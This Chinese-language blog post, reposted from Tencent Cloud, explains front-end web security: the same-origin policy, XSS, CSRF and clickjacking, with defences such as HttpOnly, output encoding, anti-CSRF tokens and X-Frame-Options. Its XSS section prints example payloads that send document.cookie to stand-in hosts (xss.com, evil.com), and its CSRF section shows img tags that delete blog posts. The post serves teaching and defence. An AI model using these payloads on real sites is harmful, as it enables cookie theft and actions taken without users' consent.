---
title: 浅谈前端安全
urlname: about-frontend-security
date: 2018-08-10 10:32:54
categories: 技术研究
tags: [前端, javascript, ECMAScript]
---

转自：[https://cloud.tencent.com/developer/article/1136202](https://cloud.tencent.com/developer/article/1136202)

# 安全问题的分类

## 按照所发生的区域分类
- 后端安全问题：所有发生在后端服务器、应用、服务当中的安全问题
- 前端安全问题：所有发生在浏览器、单页面应用、Web页面当中的安全问题
  
## 按照团队中哪个角色最适合来修复安全问题分类
- 后端安全问题：针对这个安全问题，后端最适合来修复
- 前端安全问题：针对这个安全问题，前端最适合来修复
  
## 综合以上
- 前端安全问题：发生在浏览器、前端应用当中或者通常由前端开发工程师来对其进行修复的安全问题
<!--more-->
  
## 浏览器安全

### 同源策略
> 是一种约定，是浏览器最核心也最基本的安全功能，限制了来自不同源的document或者脚本，对当前document读取或设置某些属性

![](/images/2018/08/iidyq95w48.png)

- 影响“源”的因素有：host（域名或者IP地址）、子域名、端口、协议
- 对浏览器来说，DOM、Cookie、XMLHttpRequest会受到同源策略的限制

#### 不受同源策略的标签
`<script>、<img>、<iframe>、<link>`等标签都可以跨域加载资源，而不受同源策略的限制

- 这些带"src"属性的标签每次加载时，浏览器会发起一次GET请求
- 通过src属性加载的资源，浏览器限制了javascript的权限，使其不能读、写返回的内容

# 三大前端安全问题

## 1、跨站脚本攻击（XSS）

### 定义
> 英文全称：Cross Site Script，XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击
 
### 本质
是一种“HTML注入”，用户的数据被当成了HTML代码一部分来执行，从而产生了新的语义

-------------

### XSS的分类

#### 1、反射型XSS：将用户输入的数据反射给浏览器。黑客需要诱使用户“点击”一个恶意链接，才能攻击成功。  
举个例子：  
1. 假设在某购物网站上搜商品，当搜不到商品时会出现  
![](/images/2018/08/ow7pa2xmka.png)

此时的URL是`https://category.vip.com/suggest.php?keyword=xss&ff=235|12|1|1`

1. 在搜索框输入`<script>alert('xss')</script>`  
2. 如果前端页面没有对搜索框的内容进行过滤，而是直接发送，这时，URL地址栏应该会显示`https://category.vip.com/suggest.php?keyword=<script>alert('xss')</script>&ff=235|12|1|1`，从而alert出xss，但事实却是已经转码了的：`https://category.vip.com/suggest.php?keyword=%3Cscript%3Ealert(%27xss%27)%3C%2Fscript%3E&ff=235|12|1|1`  
3. 假设前端页面没有进行处理，那么攻击者就可以通过构造来获取用户的cookie的地址，来诱使用户来访问这个地址，比如说`https://category.vip.com/suggest.php?keyword=<script>document.location='http://xss.com/get?cookie='+document.cookie</script>&ff=235|12|1|1`  

#### 2、存储型XSS：把用户输入的数据“存储”在服务器端，这种XSS具有很强的稳定性。
比如说，黑客写下一篇包含恶意javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在浏览器中执行这段恶意的javascript代码，黑客把恶意的脚本保存到服务器端

#### 3、DOM Based XSS：通过修改页面的DOM节点形成的XSS。
举个例子：  
![](/images/2018/08/y3gm5kihsj.png)

1. 在输入框中输入内容后点击write  
![](/images/2018/08/cc8ci5vca3.png)

2. 此时再点击a链接  
![](/images/2018/08/fsrymnkp3k.png)

**原理：** 首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符"//"注释掉第二个单引号。点击此链接，脚本将被执行。

----------------------

### XSS Payload攻击

#### 定义
> XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为XSS Payload。实际上就是Javascript脚本（或者Flash或其他富客户端的脚本），所以XSS Payload能够做到任何javascript脚本能实现的功能

#### 实例
- 通过读取浏览器的cookie对象，从而发起“cookie劫持”攻击
1. 攻击者首先加载一个远程脚本 `http://www.a.com/test.htm?abc="><script src=http://www.evil.com/evil.js></script>`
2. 真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的Javascript代码
3. 在evil.js中，通过如下代码窃取cookie `var img = document.createElement("img");`
4. `img.src = "http://www.evil.com/log?"+escape(document.cookie);`
5. `document.body.appendChild(img);`
6. 以上代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器中
7. [http://www.evil.com/log](http://www.evil.com/log) 并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录 `127.0.0.1 - - [119/Jul/2010:11:30:42 + 0800] "GET /log?cookie1%3D1234 HTTP/1.1" 404 288`
- 通过模拟GET、POST请求操作用户的浏览器（在“cookie劫持”失效时，或者目标用户的网络不能访问互联网等情况时会非常有用）
  1. 假设某博客页面存在XSS漏洞，那么可以通过构造get请求操作用户浏览器  
  2. 假设正常删除博客文章的链接为`http://blog.test.com/manage/entry.do?m=delete&id=1245862`
  3. 对于攻击者来说，只需要知道文章的id，就能够通过这个请求来删除这篇文章
  4. 攻击者可以通过插入一张图片来发起一个get请求  
  ![](/images/2018/08/lzkcgzju99.png)  
  5. 攻击者只需要让博客作者执行这段javascript代码也就是XSS Payload，就会删除这篇文章
   
----------------------

### XSS的防御

#### 1、HttpOnly
> 浏览器禁止页面的Javascript访问带有HttpOnly属性的cookie。（实质解决的是：XSS后的cookie劫持攻击）如今已成为一种“标准”的做法

不同语言给cookie添加HttpOnly的方式不同，比如
- JavaEE：`response.setHeader("Set-Cookie","cookiename=value; Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");`
- PHP4：`header("Set-Cookie:hidden=value;httpOnly");`
- PHP5：`setcookie("abc","test",NULL,NULL,NULL,NULL,TRUE);     //true为HttpOnly属性`

#### 2、输入检查（XSS Filter）
- 原理：让一些基于特殊字符的攻击失效。（常见的Web漏洞如XSS、SQLInjection等，都要求攻击者构造一些特殊字符）
- 输入检查的逻辑，必须放在服务器端代码中实现。_***目前Web开发的普遍做法，是同时哎客户端Javascript中和服务端代码中实现相同的输入检查。客户端的输入检查可以阻挡大部分误操作的正常用户，节约服务器资源。**_

#### 3、输出检查
> 在变量输出到HTML页面时，使用编码或转义的方式来防御XSS攻击

- 针对HTML代码的编码方式：HtmlEncode
- PHP：htmlentities()和htmlspecialchars()两个函数
- Javascript：JavascriptEncode（需要使用“\”对特殊字符进行转义，同时要求输出的变量必须在引号内部）
- 在URL的path（路径）或者search（参数）中输出，使用URLEncode
具体实施可以参考：[http://www.cnblogs.com/lovesong/p/5211667.html](http://www.cnblogs.com/lovesong/p/5211667.html)

-----------------------

### 防御DOM Based XSS
- **DOM Based XSS的形成：** （举个例子）  
![](/images/2018/08/g7y4enjbig.png)
- **实质：** 从Javascript中输出数据到HTML页面里
- **这个例子的解决方案：** 做一次HtmlEncode

**防御方法：分语境使用不同的编码函数**

----------------------------------

### 总结
**XSS漏洞虽然复杂，但是却是可以彻底解决的。在设计解决方案时，应该针对不同场景理解XSS攻击的原理，使用不同的方法**

## 2、CSRF（跨站点请求伪造）
### 什么是CSRF
首先来看个例子：  
> 攻击者首先在自己的域构造一个页面：`http://www.a.com/csrf.html`，其内容为 `<img src="http://blog.sohu.com/manage/entry.do?m=deleted&id=156714243" />`
使用了一个img标签，其地址指向了删除Iid为156714243的博客文章
然后攻击者诱使目标用户，也就是博客主人访问这个页面
用户进去看到一张无法显示的图片，这时自己的那篇博客文章已经被删除了


**原理：** 在刚才访问 `http://www.a.com/csrf.html` 页面时，图片标签向服务器发送了一次get请求，这次请求导致了博客文章被删除

___这种删除博客文章的请求，是攻击者伪造的，所以这种攻击就叫做“跨站点请求伪造”___

### CSRF的原理
![](/images/2018/08/42jy9nsxn5.jpeg)

参考上图，我们可以总结，完成一次CSRF攻击，必须满足两个条件

1. 用户登录受信任网站A，并且在本地生成Cookie
2. 在不登出网站A的情况下，访问危险网站B

#### CSRF本质
> CSRF攻击是攻击者利用用户身份操作用户账户的一种攻击方式

### CSRF的防御
**CSRF能攻击成功的本质原因：** 重要操作的所有参数都是可以被攻击者猜测到的

#### 解决方案

##### 1、验证码
CSRF攻击过程中，用户在不知情的情况下构造了网络请求，添加验证码后，强制用户必须与应用进行交互  
- 优点：简洁而有效
- 缺点：网站不能给所有的操作都加上验证码

##### 2、Referer Check
> 利用HTTP头中的Referer判断请求来源是否合法
Referer首部包含了当前请求页面的来源页面的地址
 
- 优点：简单易操作（只需要在最后给所有安全敏感的请求统一添加一个拦截器来检查Referer的值就行）
- 缺点：服务器并非什么时候都能取到Referer
 
  1. 很多出于保护用户隐私的考虑，限制了Referer的发送。
  2. 比如从HTTPS跳转到HTTP，出于安全的考虑，浏览器不会发送Referer

**浏览器兼容性**
![](/images/2018/08/d4nntcmp9f.png)

关于Referer的更多详细资料：[https://75team.com/post/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header-fastmail-blog.html](https://75team.com/post/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header-fastmail-blog.html)

##### 3、使用Anti CSRF Token
- 比如一个删除操作的URL是：`http://host/path/delete?uesrname=abc&item=123`
- 保持原参数不变，新增一个参数Token，Token值是随机的，不可预测
- `http://host/path/delete?username=abc&item=123&token=[random(seed)]`  

___由于Token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击___
- 优点：比检查Referer方法更安全，并且不涉及用户隐私
- 缺点：对所有的请求都添加Token比较困难

更多关于CSRF详细可参考：  
1. CSRF 攻击的应对之道：https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/
2. CSRF原理剖析：http://netsecurity.51cto.com/art/200812/102951.htm
3. 维基百科CSRF：https://en.wikipedia.org/wiki/Cross-site_request_forgery
4. CSRF实例：http://netsecurity.51cto.com/art/200812/102925.htm

**需要注意的点：** 
1. Token需要足够随机，必须用足够安全的随机数生成算法
2. Token应该为用户和服务器所共同持有，不能被第三方知晓
3. Token可以放在用户的Session或者浏览器的Cookie中
4. 尽量把Token放在表单中，把敏感操作由GET改为POST，以form表单的形式提交，可以避免Token泄露（比如一个页面：`http://host/path/manage?username=abc&token=[random]`，在此页面用户需要在这个页面提交表单或者单击“删除”按钮，才能完成删除操作，在这种场景下，如果这个页面包含了一张攻击者能指定地址的图片 `<img src="http://evil.com/notexist" />`，则这个页面地址会作为HTTP请求的Refer发送到evil.com的服务器上，从而导致Token泄露）

-----------------

### XSRF攻击
> 当网站同时存在XSS和CSRF漏洞时，XSS可以模拟客户端浏览器执行任意操作，在XSS攻击下，攻击者完全可以请求页面后，读取页面内容中的Token值，然后再构造出一个合法的请求

### 结论
**安全防御的体系应该是相辅相成、缺一不可的**

## 3、点击劫持（ClickJacking）
### 什么是点击劫持
> 点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。

### 防御点击劫持：X-Frame-Options
X-Frame-Options HTTP响应头是用来给浏览器指示允许一个页面能否在`<frame>、<iframe>、<object>`中展现的标记
 
### 有三个可选的值
1. DENY：浏览器会拒绝当前页面加载任何frame页面（即使是相同域名的页面也不允许）
2. SAMEORIGIN：允许加载frame页面，但是frame页面的地址只能为同源域名下的页面
3. ALLOW-FROM：可以加载指定来源的frame页面（可以定义frame页面的地址）

**浏览器的兼容性**  
![](/images/2018/08/wj8yquphly.png)

## 小结
**综合以上三大前端安全，我们可以总结**
1. 谨慎用户输入信息，进行输入检查（客户端和服务端同时检查）
2. 在变量输出到HTML页面时，都应该进行编码或转义来预防XSS攻击
3. 该用验证码的时候一定要添上
4. 尽量在重要请求上添加Token参数，注意Token要足够随机，用足够安全的随机数生成算法